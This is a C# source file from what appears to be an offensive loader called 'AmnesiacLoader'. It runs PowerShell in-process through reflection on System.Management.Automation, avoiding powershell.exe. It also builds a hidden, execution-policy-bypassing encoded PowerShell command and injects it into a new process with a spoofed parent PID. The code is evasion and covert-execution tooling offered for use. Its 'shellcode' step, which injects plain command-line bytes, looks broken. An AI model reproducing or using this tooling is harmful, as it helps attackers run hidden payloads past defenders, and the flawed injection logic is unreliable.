// AmnesiacLoader — In-Process CLR Hosting (Unmanaged PowerShell)
// Runs a PS script inside the current process via SMA Runspace (no powershell.exe).
// InjectUnmanagedPS: runs psScript in-process (target already has AmnesiacLoader loaded).
// SpawnUnmanagedPS:  spawns a new process via InjectNewProcess + delivers encoded PS payload.

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace AmnesiacLoader
{
    public class UnmanagedPS
    {
        // Run psScript in the current process using a SMA Runspace via reflection.
        // 'pid' is ignored — method runs in-process for API symmetry with Injector.
        public static bool InjectUnmanagedPS(int pid, string psScript)
        {
            return RunScriptInProcess(psScript);
        }

        // Spawn processPath with PPID spoofed to spoofParentPid, inject a PowerShell
        // encoded-command bootstrap as shellcode (UTF-8 command bytes).
        public static bool SpawnUnmanagedPS(string processPath, string psScript, int spoofParentPid)
        {
            // Encode psScript as EncodedCommand (UTF-16LE base64) for powershell.exe
            byte[] utf16  = Encoding.Unicode.GetBytes(psScript);
            string b64cmd = Convert.ToBase64String(utf16);
            string fullCmd = "powershell.exe -ep bypass -nop -w hidden -EncodedCommand " + b64cmd;
            byte[] shellcode = Encoding.UTF8.GetBytes(fullCmd);
            return Injector.InjectNewProcess(processPath, shellcode, spoofParentPid);
        }

        static bool RunScriptInProcess(string psScript)
        {
            try
            {
                // Find or load System.Management.Automation
                Assembly sma = FindSma();
                if (sma == null) return false;

                Type   rsFactory   = sma.GetType("System.Management.Automation.Runspaces.RunspaceFactory");
                object runspace    = rsFactory.InvokeMember(
                    "CreateRunspace",
                    BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static,
                    null, null, new object[0]);

                runspace.GetType().GetMethod("Open").Invoke(runspace, null);

                object pipeline = runspace.GetType()
                    .GetMethod("CreatePipeline", new Type[] { typeof(string) })
                    .Invoke(runspace, new object[] { psScript });

                pipeline.GetType().GetMethod("Invoke", new Type[0]).Invoke(pipeline, null);

                runspace.GetType().GetMethod("Close").Invoke(runspace, null);
                return true;
            }
            catch { return false; }
        }

        static Assembly FindSma()
        {
            // Check if SMA is already loaded in the AppDomain
            foreach (Assembly a in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (string.Equals(a.GetName().Name, "System.Management.Automation",
                    StringComparison.OrdinalIgnoreCase))
                    return a;
            }
            // Attempt to load from GAC (present on any machine with PS installed)
            try
            {
                return Assembly.Load(
                    "System.Management.Automation, Version=3.0.0.0, " +
                    "Culture=neutral, PublicKeyToken=31bf3856ad364e35");
            }
            catch { return null; }
        }
    }
}
